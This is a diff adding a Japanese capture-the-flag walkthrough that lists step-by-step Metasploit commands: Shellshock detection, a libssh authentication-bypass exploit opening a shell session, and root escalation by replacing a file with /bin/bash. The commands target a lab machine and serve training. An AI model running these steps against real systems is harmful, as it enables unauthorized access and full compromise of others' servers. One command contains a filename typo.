@@ -1,0 +1,44 @@
+ターゲットの最初のフラグのキーを保持している可能性のあるファイルのルート('/')ディレクトリを確認する
+1) nmapでネットワークスキャンを行う
+2) ブラウザでターゲットを検索する
+3) 以下のコマンドを使って、shellshockに対して、脆弱であるかを確認する
+use auxiliary/scanner/http/apache_mod_cgi_bash_env
+set RHOSTS
+set TARGETURI
+run
+でチェックする。
+4) meterperterを取得後、シェルを操作して、インタラクティブシェルに切り替える
+shell
+/bin/bash -i
+cd /
+ls
+
+サーバーのルートディレクトリに何か隠されている可能性がある。/opt/apache/htdocs/を注意深く調べる
+1) cd /opt/apache/htdocs/
+2) 以下のコマンドを使って、隠しファイルを表示するようにする
+ls -la
+
+ユーザーのホームディレクトリを調査し、libssh_auth_bypassの使用を検討する
+1) nmapで情報収集を行う
+2) search libssh_auth_bypass
+3) use 0
+4) 情報の設定を行う
+set RHOSTS
+set SPAWN_PTY true
+5) exploitでセッションを開く。
+6) sessions
+7) sessions -i 2
+8) cd /home/user
+9) ls
+
+最も制限された領域には、しばしば最も貴重な秘密が隠されている。「/root」ディレクトリを調べる
+1) 「greeting」と「welcome」のファイルを見つけたらそれを使って権限昇格を行う
+2) fileコマンドを使って、バイナリであることを確認する
+3) ls -lで確認する
+4) ./welcomeを実行して、strings welcomeを実行する
+5) rm greetongs
+6) cp /bin/bash greetings
+7) ./welcome
+8) ls
+9) cd root
+10) ls
